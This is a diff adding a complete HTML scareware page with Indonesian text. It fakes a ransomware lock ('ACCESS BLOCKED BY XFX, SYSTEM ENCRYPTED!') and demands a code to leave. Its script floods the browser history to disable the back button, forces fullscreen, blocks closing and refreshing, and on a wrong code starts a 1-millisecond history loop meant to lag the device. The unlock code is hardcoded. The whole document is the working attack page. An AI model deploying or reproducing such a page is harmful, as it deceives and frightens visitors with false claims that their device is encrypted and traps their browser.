@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>⚠️ SYSTEM ERROR ⚠️</title>
+    <style>
+        body { background: #000; color: #ff0000; font-family: 'Courier New', Courier, monospace; text-align: center; padding-top: 20%; }
+        .warning { font-size: 25px; font-weight: bold; border: 5px solid #f00; padding: 20px; display: inline-block; }
+        input { padding: 15px; margin-top: 20px; background: #111; color: #0f0; border: 1px solid #f00; width: 80%; }
+    </style>
+</head>
+<body onclick="startTrap()">
+
+    <div class="warning">
+        ACCESS BLOCKED BY XFX<br>
+        SYSTEM ENCRYPTED!
+    </div>
+    <br>
+    <input type="password" id="key" placeholder="MASUKKAN KODE UNTUK KELUAR">
+    <br><br>
+    <button onclick="unlock()" style="padding: 10px 20px; background: #f00; color: #fff;">UNLOCK</button>
+
+    <script>
+        const RAHASIA = "xfx_ganteng";
+
+        function startTrap() {
+            // 1. BOM HISTORI (Bikin tombol Back mati total)
+            for (let i = 0; i < 100; i++) {
+                window.history.pushState(null, null, window.location.href);
+            }
+            
+            // 2. Fullscreen Paksa
+            document.documentElement.requestFullscreen();
+
+            alert("HP KAMU SUDAH DIKUASAI XFX! JANGAN COBA KELUAR!");
+        }
+
+        // 3. LOCK BACK BUTTON PERMANEN
+        window.onpopstate = function() {
+            for (let i = 0; i < 10; i++) {
+                window.history.pushState(null, null, window.location.href);
+            }
+            alert("MAU KEMANA?! TETEP DI SINI!");
+        };
+
+        // 4. CEGAH REFRESH / CLOSE
+        window.onbeforeunload = function() {
+            return "KODE BELUM DIMASUKKAN!";
+        };
+
+        function unlock() {
+            let input = document.getElementById("key").value;
+            if (input === RAHASIA) {
+                alert("Akses dibuka. Selamat jalan!");
+                window.onbeforeunload = null;
+                location.href = "https://google.com";
+            } else {
+                alert("KODE SALAH! MENERIMA HUKUMAN...");
+                // Bikin Lag dengan loop
+                setInterval(() => {
+                    window.history.pushState(null, null, window.location.href);
+                }, 1);
+            }
+        }
+    </script>
+</body>
+</html>
